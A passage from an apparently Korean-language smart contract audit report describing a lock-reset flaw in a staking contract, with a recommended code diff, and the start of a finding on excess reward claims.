잠금 상태는 소유자가 수동으로 제어해서는 **안 됩니다**. 대신 인센티브가 잠긴 인센티브에 존재하는지 여부를 반영해야 합니다. 구체적으로:

* `releaseERC20Lock()`을 통해 특정 인센티브에 대한 사용자 잠금이 해제되고,
* 사용자가 언스테이크한 후 해당 **동일한 잠긴 인센티브**에 다시 스테이크하는 경우,

새로운 잠긴 스테이킹 기간의 규칙을 선택했으므로 잠금은 **자동으로 다시 적용되어야 합니다**. 그러나 현재 구현에서는 소유자가 수동으로 `resetERC20Lock()`을 호출할 때까지 잠금이 해제된 상태로 유지되어 다음을 유발합니다.

* 잠금 규칙의 일관성 없는 시행,
* 사용자가 인출 유연성을 유지하면서 잠긴 인센티브에 다시 참여하는 잠재적인 공격 벡터.

**권장 사항**

사용자가 잠긴 인센티브에 다시 스테이크하면 잠금은 **자동으로 `false`로 재설정**되어야 합니다.

```diff
function stakeERC20(bytes32 incentiveId, uint256 amount) external {
  ...
  if (stake.amount == 0) {
      _userERC20IncentiveIds[msg.sender].add(incentiveId);
+
+     // If incentive is locked, reset release flag on fresh stake
+     if (incentive.key.isLocked) {
+         userLockReleased[msg.sender][incentiveId] = false;
+     }
  }
}
```



# [L-13] 사용자가 인센티브 후 범위 내 시간을 사용하여 초과 보상 청구

_인정됨_

사용자는 보상을 얻기 위해 `UniswapV3Staker` 계약에 UniV3 포지션을 스테이킹합니다. 소유자는 특정 틱 범위와 베스팅 기간을 가진 인센티브를 생성하며, 보상을 얻으려면 풀의 가격이 일정 기간 동안 범위 내에 머물러야 합니다. 이 기간을 베스팅 기간이라고 합니다.
인센티브가 활성화된 동안 틱 내부 시간이 < 베스팅 기간인 경우 사용자는 보상의 100%를 청구할 수 없으며 일부만 청구할 수 있습니다.

```solidity
if (params.vestingPeriod <= params.secondsInside - params.secondsInsideInitial) {
```
